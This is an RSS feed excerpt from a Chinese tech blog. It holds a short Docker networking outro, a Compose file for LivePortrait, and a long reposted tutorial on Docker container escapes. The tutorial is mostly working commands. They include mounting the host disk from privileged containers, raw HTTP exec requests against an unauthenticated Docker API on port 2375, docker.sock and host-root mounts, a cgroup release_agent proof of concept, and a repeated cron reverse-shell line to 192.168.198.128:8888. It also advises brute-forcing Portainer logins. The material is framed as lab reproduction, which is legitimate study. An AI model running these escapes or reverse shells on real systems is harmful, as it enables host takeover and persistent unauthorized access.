<p>尽管overlay（overlay2）和macvlan都可以实现跨宿主机通信，但是相对的前者更为便捷一些，但是随着新容器编排技术的不断涌现，这些当时时髦的技术也终将被替代。就连docker官网自己推出的Docker-compose[官网]（它是一个单机多容器部署工具，不支持多机）编排工具，也正在被k8s（支持多容器、多机部署）替代，后续将陆续对这些编排工具做具体介绍。</p>
<p>不过这些不重要，长江后浪推前浪，k8s终究是配置太多，强大的同时也太繁琐，终将会被更强大的其他替代，万变不离其宗，了解了这些底层些的知识，再学习其他编排工具时，也更加是游刃有余。</p>
<h2>附注</h2>
<ol>
<li>
<p>Docker容器 | Dockerfile优化</p>
</li>
<li>
<p>Docker容器的生命周期 | kill和stop | pause 和 unpause</p>
</li>
<li>
<p>Docker容器五种(3+2)网络模式 | bridge模式 | host模式 | none模式 | container 模式 | 自定义网络模式详解</p>
</li>
<li>
<p>Docker外部浏览器访问容器 | 容器访问容器 | 访问容器的常用5种方式 | -p -P 详解</p>
</li>
<li>
<p>Docker容器之间单/双向通信 |--link /自定义网络实现互认容器别名</p>
</li>
<li>
<p>Docker容器间数据挂载与共享 | 远程共享&amp;挂载数据卷</p>
</li>
</ol>
]]></content:encoded>
    </item>
    <item>
      <title>Docker运行kwaivgi-liveportrait</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E8%BF%90%E8%A1%8Ckwaivgi-liveportrait.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E8%BF%90%E8%A1%8Ckwaivgi-liveportrait.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker运行kwaivgi-liveportrait</source>
      <description>Docker运行kwaivgi-liveportrait Docker Compose File 运行容器 将上面的composefile 保存为 docker-comopose.yaml然后运行下面的命令进行安装：</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>Docker Compose File</h2>
<div class="language-yaml line-numbers-mode" data-highlighter="shiki" data-ext="yaml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-yaml"><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"3"</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">services</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    kwaivgi-liveportrait</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        stdin_open</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">true</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        tty</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">true</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        deploy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            resources</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">                reservations</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">                    devices</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                        - </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">driver</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">nvidia</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">                          count</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">all</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">                          capabilities</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                              - </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">gpu</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        ports</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">            - </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">7860:7860</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        restart</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">always</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        container_name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">kwaivgiliveportrait</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        image</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">jokerdragon/kwaivgi-liveportrait:latest</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        command</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">python app.py</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>运行容器</h2>
<p>将上面的composefile 保存为 docker-comopose.yaml然后运行下面的命令进行安装：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compose</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> up</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Docker逃逸漏洞案例</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker逃逸漏洞案例</source>
      <description>Docker逃逸漏洞案例 https://zhuanlan.zhihu.com/p/588513910 什么是Docker Docker是一个开源的引擎,可以轻松的为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署,包括VMs(虚拟机)、bare metal、OpenStack 集群和其他...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/588513910" target="_blank" rel="noopener noreferrer">https://zhuanlan.zhihu.com/p/588513910</a></p>
</blockquote>
<h2><strong>什么是Docker</strong></h2>
<p>Docker是一个开源的引擎,可以轻松的为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署,包括VMs(虚拟机)、bare metal、OpenStack 集群和其他的基础应用平台。</p>
<h3><strong>判断当前是否为docker环境</strong></h3>
<p>首先在我们拿到一个主机权限之后，需要判断该权限所处环境是不是docker，可以使用下面两条命令</p>
<ol>
<li>是否存在.dockerenv文件，若该文件存在则为docker环境，若不存在该文件则当前环境非docker环境<code>ls -alh /.dockerenv</code></li>
</ol>
<p></p>
<p></p>
<ol start="2">
<li>查询系统进程的cgroup信息，docker环境中的cgroup文件普遍存在docker字段，而真实环境中不存在docker字段<code>cat /proc/1/cgroup</code></li>
</ol>
<p></p>
<p></p>
<h2><strong>Docker逃逸漏洞案例</strong></h2>
<p>Docker容器是使用沙盒机制，是单独的系统，理论上是很安全的，通过利用某种手段，再结合执行EXP或POC，就可以返回一个宿主机的高权限shell，并拿到宿主机的root权限，可以直接操作宿主机文件，从容器中逃了出来，因此我们将其称为Docker逃逸漏洞案例漏洞。</p>
<h2><strong>Portainer后台挂载宿主机根目录进行逃逸</strong></h2>
<p>Portainer是一个可视化的容器镜像的图形管理工具，利用Portainer可以轻松构建、管理和维护Docker环境，而且完全免费，基于容器化的安装方式，方便高效部署。
需要注意的是后台没有默认账号密码，当第一次登录系统时会提示设置新密码，在实战中可以尝试爆破。</p>
<h3><strong>环境搭建</strong></h3>
<p>在安装了docker的物理机中运行该命令<code>docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v  /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data  portainer/portainer-ce</code></p>
<p></p>
<p>部署成功后访问宿主机的9000端口，设置用户名与密码</p>
<p></p>
<p></p>
<h3><strong>漏洞利用</strong></h3>
<p>进入容器中，添加一个新容器</p>
<p></p>
<p>进入到portainer后台界面</p>
<p></p>
<p>这里给该容器命名并选择一个镜像</p>
<p></p>
<p>下滑到Advanced container settings将console设置为interactive &amp; tty</p>
<p></p>
<p>然后到Volumes中将根目录挂载到容器中</p>
<p></p>
<p></p>
<p>然后点击部署即可</p>
<p></p>
<p>部署成功后回到容器中，进入到该容器终端内
进入到终端后，输入如下命令<code>ls /tide/</code>
<code>chroot /tide/ bash</code></p>
<p></p>
<p>如此成功逃逸到宿主机中，也可直接反弹shell<code>echo '* * * * * bash -i &gt;&amp; /dev/tcp/192.168.198.128/8888 0&gt;&amp;1' &gt;&gt; /var/spool/cron/root</code></p>
<p></p>
<h2><strong>privileged特权模式启动容器</strong></h2>
<p>特权模式逃逸是一种最简单有效的逃逸方法，该漏洞的原理是宿主机使用root用户或使用sudo命令启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载到容器内部，获取对整个宿主机的文件读写权限，可直接通过chroot切换根目录、写ssh公钥和crontab计划等逃逸到宿主机。</p>
<h3><strong>特权模式与非特权模式的区别</strong></h3>
<ul>
<li><code>Linux Capabilities</code></li>
</ul>
<ol>
<li>普通模式下容器内进程只可以使用有限的一些Linux Capabilities</li>
<li>特权模式下的容器内进程可以使用所有的Linux Capabilities</li>
</ol>
<ul>
<li>
<p>Linux敏感目录 1.  普通模式下，部分内核模块路径比如/proc下的一些目录需要阻止写入、有些又需要允许读写，这些文件目录将会以tmpfs文件系统的方式挂载到容器中，以实现目录mask的需求 2. 特权模式下，这些目录将不再以tmpfs文件系统的方式挂载</p>
</li>
<li>
<p>任何内核文件都是可读写 1. 普通模式下，部分内核文件系统（sysfs、procfs）会被只读的方式挂载到容器中，以阻止容器内进程随意修改系统内核 2. 特权模式下，内核文件系统将不再以只读的方式被挂载</p>
</li>
<li>
<p>APPArmor和Seccomp</p>
</li>
</ul>
<ol>
<li>普通模式下，可以通过配置APPArmor或Seccomp相关安全选项</li>
<li>特权模式下，这些AppArmor或Seccomp相关配置将不再生效</li>
</ol>
<ul>
<li>cgroup读写</li>
</ul>
<ol>
<li>默认情况下，只能以只读模式操作cgroup</li>
<li>特权模式下，将可以对cgroup进行读写操作</li>
</ol>
<ul>
<li>/dev</li>
</ul>
<ol>
<li>普通模式下，容器内/dev目录下看不到节点/dev目录下特有的devices</li>
<li>特权模式下，容器内的/dev目录会包含这些来自节点/dev目录下的那些内容</li>
</ol>
<ul>
<li>SELinux</li>
</ul>
<ol>
<li>
<p>特权模式下，SELinux相关的安全加固配置将被禁用</p>
</li>
<li>
<p>普通模式下也可以通过对应的安全选项来禁用SELinux特性</p>
</li>
</ol>
<h3><strong>判断方法</strong></h3>
<p>在容器中可以使用该命令检测当前容器是否以特权模式启动<code>cat /proc/self/status | grep Cap</code>如果是特权模式启动的话，CapEff对应的掩码值在centos中为 0000001fffffffff ，在ubuntu中为0000003fffffffff，如下图</p>
<p></p>
<p></p>
<h3><strong>环境搭建</strong></h3>
<p>在安装有docker机器的主机上直接运行该命令，启动该容器即可。<code>docker run -it --privileged ubuntu:18.04</code></p>
<p></p>
<h3><strong>漏洞利用</strong></h3>
<p>首先我们为了区别宿主机与docker容器的区别，我们先在宿主机中新建一个文件，作为标识区别</p>
<p></p>
<p>在启动后我们会进入到docker容器的bash中，在这里我们查看当前主机的docker是否为特权模式启动。<code>cat /proc/self/status | grep Cap</code></p>
<p></p>
<p>我们可以将宿主机目录挂载到该docker容器中，首先查看当前磁盘分区情况，获得宿主机分区<code>fdisk -l</code></p>
<p></p>
<p>这里我们根据分区大小得知到宿主机的磁盘为/dev/dm-0，这时可以直接挂载宿主机的磁盘</p>
<p><code>mkdir tide</code>
<code>mount /dev/dm-0 /tide/</code>
<code>chroot /tide/</code></p>
<p></p>
<p>这时我们会进入一个bash会话，在这里可以查看宿主机的/etc/passwd等敏感文件</p>
<p></p>
<p>这时去查看刚刚我们在宿主机根目录中创建的flag.txt文件，看其是否存在，就能判断出我们当前是否已经成功跳出docker容器</p>
<p></p>
<p>这里可以看到我们现在已经成功跳出了docker容器，获得了宿主机的权限，可以使用计划任务反弹shell<code>echo '* * * * * bash -i &gt;&amp; /dev/tcp/192.168.198.128/8888 0&gt;&amp;1' &gt;&gt; /var/spool/cron/root</code></p>
<p></p>
<h2><strong>Docker API 未授权访问</strong></h2>
<p>该漏洞起因是因为使用Docker Swarm时，管理的docker 节点上便会开放一个TCP端口2375/2376，绑定在0.0.0.0上，如果没有做限制访问来源的话，攻击者可以通过Doker未授权来控制服务器。</p>
<h3><strong>环境搭建</strong></h3>
<p>在vulhub中存在该漏洞复现环境，部署命令如下：<code>cd docker/unauthorized-rce/</code>
<code>docker-compose build</code>
<code>docker-compose up -d</code>
<code>docker-compose ps</code></p>
<p></p>
<p>也可以在真实Docker中部署该环境，部署步骤如下：<code>#下载环境</code>
<code>curl -o /etc/yum.repos.d/Centos-7.repo http://mirrors.aliyun.com/repo/Centos-7.repo</code>
<code>curl -o /etc/yum.repos.d/docker-ce.repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</code>
<code>yum clean all &amp;&amp; yum makecache</code></p>
<p></p>
<p>安装指定版本docker<code>yum install -y docker-ce-18.09.9</code></p>
<p></p>
<p>配置加速源</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/docker/daemon.json</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "registry-mirrors"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.zhai.cm"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://a.ussh.net"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://hub.littlediary.cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://hub.rat.dev"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://atomhub.openatom.cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.m.daocloud.io"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.1ms.run"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://dytt.online"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://func.ink"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://lispy.org"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.xiaogenban1993.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.mybacc.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.yomansunter.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://dockerhub.websoft9.com"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  ]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p></p>
<p>设置开机自启：<code>systemctl enable docker</code>
<code>systemctl daemon-reload</code></p>
<p></p>
<p>启动contianerd服务：<code>containerd  #启动</code>
<code>systemctl status containerd # 查看服务状态</code></p>
<p></p>
<p>开启2375端口，提供外部访问：<code>vim /usr/lib/systemd/system/docker.service</code>
<code>ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375  -H fd:// --containerd=/run/containerd/containerd.sock</code></p>
<p></p>
<p>改完之后需要重启：<code>systemctl daemon-reload</code>
<code>systemctl restart docker</code></p>
<p>然后我这里还需要在防火墙中将2375端口放行，命令如下：<code>systemctl start firewalld</code>
<code>firewall-cmd --zone=public --add-port="2375"/tcp --permanent</code>
<code>firewall-cmd --permanent --query-port="2375"/tcp</code>
<code>systemctl restart firewalld</code></p>
<p>接下来我们访问该ip的2375端口即可，当我们访问时会返回 404 page not found。这是 Docker RemoteAPI，可以执行docker命令。</p>
<p></p>
<p>这里如果我们继续访问<a href="http://192.168.198.129:2375/version" target="_blank" rel="noopener noreferrer">http://192.168.198.129:2375/version</a>，会返回docker的版本信息，这样证明该漏洞存在。</p>
<p></p>
<p>比如访问 <a href="http://192.168.198.129:2375/containers/json" target="_blank" rel="noopener noreferrer">http://192.168.198.129:2375/containers/json</a> 会返回docker信息，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成。</p>
<p></p>
<h3><strong>漏洞利用</strong></h3>
<h3><strong>利用方法1 命令执行</strong></h3>
<p>访问 <a href="http://192.168.198.129:2375/containers/json" target="_blank" rel="noopener noreferrer">http://192.168.198.129:2375/containers/json</a> 获得刚刚返回的exec_id的参数，构造如下数据包：</p>
<p></p>
<p><code>POST /containers/7badb971f85814c718dcc4efdd34fead171ebdbb099bc5252f02785374e24b0f/exec HTTP/1.1</code>
<code>Host: 192.168.198.138:2375</code>
<code>Content-Type: application/json</code>
<code>Content-Length: 168</code>
<code>{</code>
<code>"AttachStdin":true,</code>
<code>"AttachStdout":true,</code>
<code>"AttachStderr":true,</code>
<code>"Cmd":[</code>
<code>"cat","/etc/passwd"</code>
<code>],</code>
<code>"DetachKeys":"ctrl-p,ctrl-q",</code>
<code>"Privileged":true,</code>
<code>"Tty":true</code>
<code>}</code>注意其中cmd的字段，这就是我们要执行的命令，发送后会得到第二个id，这里需构造一个exec_start数据包，内容如下。</p>
<p></p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>POST /exec/962fee39c29a2c9d5ea984b55673a7823aa06b6187eaf4be279f25af6cecad1f/start HTTP/1.1`</span></span>
<span class="line"><span>`Host: 192.168.198.138:2375`</span></span>
<span class="line"><span>`Content-Type: application/json`</span></span>
<span class="line"><span>`Content-Length: 36`</span></span>
<span class="line"><span>`{`</span></span>
<span class="line"><span>`"Detach":false,`</span></span>
<span class="line"><span>`"Tty":false`</span></span>
<span class="line"><span>`}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p></p>
<p>然后发送就会得到结果，至此成功获得该docker主机的rce权限，但无法逃逸到宿主机中。</p>
<h3><strong>利用方法2 远程连接，新建特权容器，逃逸到宿主机中</strong></h3>
<p>因为docker 有远程连接命令，由于2375端口暴露，可未授权访问，所以现在可以在我们的主机上通过远程方式连接doker ，然后以特权模式启动一个docker容器，从而达到逃逸到宿主机的情况</p>
<p><code>docker -H tcp://192.168.198.138:2375 ps</code>
<code>docker -H docker -H tcp://192.168.241.142:2375 run -it --privileged alpine bin/sh</code></p>
<p>进入容器后，使用fdisk -l命令查看磁盘文件<code>fdisk -l</code></p>
<p>分区大小得知到宿主机的磁盘为/dev/dm-0，这里可以使用上面我们刚刚特权模式逃逸的命令将该磁盘挂载到目录中<code>mkdir /tide/</code>
<code>mount /dev/dm-0 /tide/</code>
<code>chroot /tide/</code></p>
<p>成功逃逸到宿主机</p>
<h2><strong>挂载Docker.sock</strong></h2>
<p>Docker架构相当于C/S架构，docker.sock就是docker中套docker，docker的client和server的通信模式参考:<a href="https://link.zhihu.com/?target=https%3A//www.jb51.net/article/99019.htm" target="_blank" rel="noopener noreferrer">https://www.jb51.net/article/99019.htm</a>
利用docker.sock逃逸的前提条件</p>
<ol start="3">
<li>
<p>攻击者获得了docker容器的访问权限</p>
</li>
<li>
<p>容器已安装/var/run/docker.sock</p>
</li>
</ol>
<h3><strong>环境搭建</strong></h3>
<p>创建Docker<code>docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04</code></p>
<p>随后在docker容器中安装docker<code># ubuntu 18.04安装docker</code>
<code>apt-get update</code>
<code># 安装依赖包</code>
<code>apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</code>
<code># 添加 Docker 的官方 GPG 密钥</code>
<code>curl -fsSL https://download.docker.com/linux/ubuntu/gpg |  apt-key add -</code>
<code># 验证当前是否拥有带有指纹的密钥</code>
<code>apt-key fingerprint 0EBFCD88</code>
<code># 设置稳定版仓库</code>
<code>add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</code>
<code># 更新</code>
<code>apt-get update</code>
<code># 安装最新的Docker-ce</code>
<code>apt-get install docker-ce</code>
<code># 启动</code>
<code>systemctl enable docker</code>
<code>systemctl start docker</code></p>
<p>这时安装完成后我们就可以使用docker ps来看到宿主机上的容器了。</p>
<h3><strong>漏洞利用</strong></h3>
<p>将宿主机的根目录挂载到容器中<code>docker run -it -v /:/tide ubuntu:18.04 /bin/bash</code>
<code>chroot tide</code></p>
<p>这时可以看到返回出一个bash会话，这里我们就可以看到我们之前在宿主机中创建的flag.txt了</p>
<p>这里也可以使用计划任务反弹shell<code>echo '* * * * * bash -i &gt;&amp; /dev/tcp/192.168.198.128/8888 0&gt;&amp;1' &gt;&gt; /var/spool/cron/root</code></p>
<h2><strong>挂载宿主机根目录</strong></h2>
<p>如果在docker启动的时候挂载了宿主机的根目录，就可以通过chroot获取宿主机的权限<code>docker run -it -v /:/tide/ ubuntu:18.04</code>
<code>chroot /tide/</code></p>
<p>相同也可以通过计划任务反弹shell<code>echo '* * * * * bash -i &gt;&amp; /dev/tcp/192.168.198.128/8888 0&gt;&amp;1' &gt;&gt; /var/spool/cron/root</code></p>
<h3><strong>Cgroup执行宿主机系统命令</strong></h3>
<p>docker使用cgroup进行资源限制，当cgroup中最后一个任务结束且notify_on_release开启，release_agent可执行事先提供的命令，因此可以利用这个特性来实现容器的逃逸。</p>
<h3><strong>漏洞利用条件</strong></h3>
<p>1.以root用户身份在容器内运行</p>
<p>2.使用SYS_ADMINLinux功能运行</p>
<p>3.缺少APPArmor配置文件，否则将允许mountsyscall</p>
<p>4.cgroup V1虚拟文件系统必须以读写方式安装在容器内</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>#### 环境搭建</span></span>
<span class="line"><span></span></span>
<span class="line"><span>docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:18.04</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p></p>
<h3><strong>漏洞利用</strong></h3>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span># 挂载宿主机cgroup，自定义一个cgroup，/tmp/cgrp/x </span></span>
<span class="line"><span>mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x </span></span>
<span class="line"><span># 设置/tmp/cgrp/x的cgroup的notify_no_release和release_agent </span></span>
<span class="line"><span>#  设置/tmp/cgrp/x的notify_no_release属性设置为1，通过sed匹配出/etc/mtab中perdir=的路径,然后将路径+cmd写入/tmp/cgrp/release_agent </span></span>
<span class="line"><span>echo 1 &gt; /tmp/cgrp/x/notify_on_release </span></span>
<span class="line"><span>host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` </span></span>
<span class="line"><span>echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent </span></span>
<span class="line"><span># 写入自定义命令 </span></span>
<span class="line"><span>echo '#!/bin/sh' &gt; /cmd </span></span>
<span class="line"><span># 结果在当前目录的output文件中 </span></span>
<span class="line"><span>echo "cat /flag.txt &gt; $host_path/output" &gt;&gt; /cmd </span></span>
<span class="line"><span>chmod a+x /cmd </span></span>
<span class="line"><span># 执行完sh -c之后，sh进程自动退出，cgroup /tmp/cgrp/x里不再包含任何任务，/tmp/cgrp/release_agent文件里的shell将被操作系统内核执行,达到了容器逃逸的效果 </span></span>
<span class="line"><span>sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p></p>
<p>如上图所示，成功获取到宿主机根目录的flag.txt的内容，同理，我们将上面poc中的echo中的命令修改为反弹shell的命令，即可进行反弹shell，获得宿主机的权限。</p>
